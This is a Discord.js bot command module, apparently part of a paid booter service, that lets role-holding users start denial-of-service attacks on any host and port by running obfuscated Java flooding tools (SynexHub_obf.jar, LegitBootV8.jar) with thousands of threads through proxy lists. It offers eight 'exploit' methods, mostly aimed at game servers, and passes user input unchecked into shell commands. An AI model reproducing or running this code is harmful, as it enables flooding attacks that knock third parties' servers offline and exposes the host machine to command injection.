const Discord = require("discord.js");
const moment = require('moment');
const ayarlar = require('../ayarlar.json');
const db = require('quick.db');


exports.run = function(client, message, args) {
    var b = message.member.roles.cache.has("856251317651111967") && message.channel.id == "856249531146305587" || message.channel.id == "854319722669539379" || message.channel.id == "855757407724109835";
    if(b) {
        if(args.length == 3) {
            var starter = require('child_process').exec
            const host = args[0]
            const blacklist = host.split(".").join("-");
            const port = args[1]
            const method = args[2]
            if(db.has("servers-" + blacklist)) {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Server blacklisted!")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**" + host + " is blacklisted!**")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed)
                return;
            }
            if(method.toLowerCase() ==="aegis") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Diamond Plan`\n**Method**: `Aegis`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`java -jar SynexHub_obf.jar host=${host} port=${port} threads=8000 file=proxy.txt method=aegis timeout=2200 loop=200`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else if(method.toLowerCase() ==="aegis2") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Diamond Plan`\n**Method**: `Aegis2`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`timeout 60 java -jar 2.jar ${host}:${port} 14 5000 1 proxy.txt 4`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else if(method.toLowerCase() ==="aegis3") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Diamond Plan`\n**Method**: `Aegis3`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`java -jar SynexHub_obf.jar host=${host} port=${port} threads=8000 file=proxy.txt method=aegis3 timeout=22000 loop=1`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else if(method.toLowerCase() ==="antibotdeluxe") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Gold Plan`\n**Method**: `AntiBotDeluxe`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`java -jar SynexHub_obf.jar host=${host} port=${port} threads=8000 file=proxy.txt method=antibotdeluxe timeout=2200 loop=30`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else if(method.toLowerCase() ==="flamecord") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Gold Plan`\n**Method**: `FlameCord`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`java -jar SynexHub_obf.jar host=${host} port=${port} threads=8000 file=proxy.txt method=bypass timeout=2200 loop=30`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else if(method.toLowerCase() ==="join") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Gold Plan`\n**Method**: `Join`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`java -jar SynexHub_obf.jar host=${host} port=${port} threads=8000 file=proxy.txt method=join timeout=2200 loop=1`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else if(method.toLowerCase() ==="handshake") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Gold Plan`\n**Method**: `Handshake`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`java -Dperdelay=4500 -jar LegitBootV8.jar ${host}:${port} 0 5 47 60 proxy.txt socks4`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else if(method.toLowerCase() ==="join2") {
                const embed = new Discord.MessageEmbed()
                .setTitle("**👑 ZIBAP S2Ş** Attack started")
                .setColor("GREEN")
                .setTimestamp()
                .setDescription("**Sikilen SW**: `" + host + ":" + port + "`\n**Sikiş Süresi**: `60`\n**Sikici Plan**: `Gold Plan`\n**Method**: `Join2`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed).then(msg => {
                    starter(`java -Dperdelay=4500 -jar LegitBootV8.jar ${host}:${port} 2 5 47 600 proxy.txt socks4`, (error, stdout, stderr) => {
                        const e = new Discord.MessageEmbed()
                        .setTitle("**👑 ZIBAP S2Ş** Attack ended")
                        .setColor("RED")
                        .setTimestamp()
                        .setDescription("Durating is over shutting down attack!")
                        .setFooter("© ZIBAPP IVJJJJ")
                        msg.edit(e)
                    });
                })
            }else{
                const embed = new Discord.MessageEmbed()
                .setColor('RED')
                .setTitle('**👑 ZIBAP S2Ş**')
                .setDescription("Usage:\n `.attack [<ip>] [<port>] [<method>]`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed)
            }
        }else if(args.length == 1) {
            if(args[0].toLowerCase() === "list"  || args[0].toLowerCase() ==="methods"  || args[0].toLowerCase() ==="exploits") {
                const embed = new Discord.MessageEmbed()
                .setColor('RED')
                .setTitle('**👑 ZIBAP S2Ş**')
                .setDescription(
                "`<--------------------> All avaible exploits <-------------------->" + 
                "`\n\n`Exploits (8)` **AEGIS,AEGIS2,AEGIS3," +
                "\nFLAMECORD,ANTIBOTDELUXE,JOIN,HANDSHAKE,JOIN2**\n\n" +
                "`<---------------------------------------------------------------->`")
                message.channel.send(embed)
            }else{
                const embed = new Discord.MessageEmbed()
                .setColor('RED')
                .setTitle('**👑 ZIBAP S2Ş**')
                .setDescription("Usage:\n `.attack [<ip>] [<port>] [<method>]`")
                .setFooter("© ZIBAPP IVJJJJ")
                message.channel.send(embed)
            }
        }else{
            const embed = new Discord.MessageEmbed()
            .setColor('RED')
            .setTitle('**👑 ZIBAP S2Ş**')
            .setDescription("Usage:\n `.attack [<ip>] [<port>] [<method>]`")
            .setFooter("© ZIBAPP IVJJJJ")
            message.channel.send(embed)
        }
    }else{
        message.channel.send("Usta Developersin galiba?")
    }
};

exports.conf = {
  enabled: true,
  guildOnly: false, 
  aliases: ['crasher'], 
  permLevel: 0 
};

exports.help = {
  name: 'attack',
  description: 'Attack command for MCReqt bot',
  usage: 'attack'
};

